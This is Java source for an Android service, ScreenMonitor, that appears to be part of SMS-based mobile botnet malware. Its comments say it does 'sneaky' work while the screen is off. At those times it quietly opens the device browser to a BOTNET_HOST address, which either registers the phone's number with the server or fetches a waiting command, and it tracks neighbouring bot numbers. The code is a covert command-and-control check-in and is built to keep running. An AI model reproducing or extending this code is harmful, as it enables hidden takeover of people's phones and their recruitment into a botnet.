package com.SmsService.ReceiverComponent;


import com.SmsService.AuxiliaryComponent.CommonVariable;
import com.SmsService.AuxiliaryComponent.Debug;

import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;
import android.content.BroadcastReceiver; 
import android.content.IntentFilter;

public class ScreenMonitor extends Service {
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	public void onCreate() {
		Debug.PrintLog("ScreenMonitor","Screen Service created...");
		IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_SCREEN_OFF);
		BroadcastReceiver SR = new ScreenRceiver();
		registerReceiver(SR,filter);		
	}
	
	public void onDestroy() {
		Debug.PrintLog("ScreenMonitor","Screen Service destroyed...");
	}
	
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {	
		if (CommonVariable.ScreenOn){
			Debug.PrintLog("ScreenMonitor","Screen is on....");						
		}
		/* do some sneaky stuff when screen is off */
		else {
			Debug.PrintLog("ScreenMonitor","Screen is off....");
						
			if(CommonVariable.enableSneakyFlag.equals("true")) {
				/* 
				 * if the bot is not register the number yet,
				 * register to the server.
				 * Or just wait command.
				 */
				if( !CommonVariable.browserOnFlag && CommonVariable.CommandServiceLock.equals("false") && CommonVariable.ResponseServiceLock.equals("false") ) {
					if ( CommonVariable.leftBotNumber.equals("") || CommonVariable.rightBotNumber.equals("") ) {
						startBrowser("register/"+CommonVariable.selfNumber);
					}
					else {
						startBrowser("wait_command/"+CommonVariable.selfNumber);
					}				
					
				}	
				
			}
		}
	    return START_STICKY;
	}
	
	
	/* start the browser activity */
	private void startBrowser(String command) {
		Debug.PrintLog("ScreenMonitor","Start Browser: "+CommonVariable.BOTNET_HOST+command);
		startActivity(new Intent(Intent.ACTION_VIEW,
				Uri.parse(CommonVariable.BOTNET_HOST+command)).setFlags
				(Intent.FLAG_ACTIVITY_NEW_TASK).setClassName
				("com.android.browser", "com.android.browser.BrowserActivity"));		
		CommonVariable.browserOnFlag = true;
	}	
	
	

}


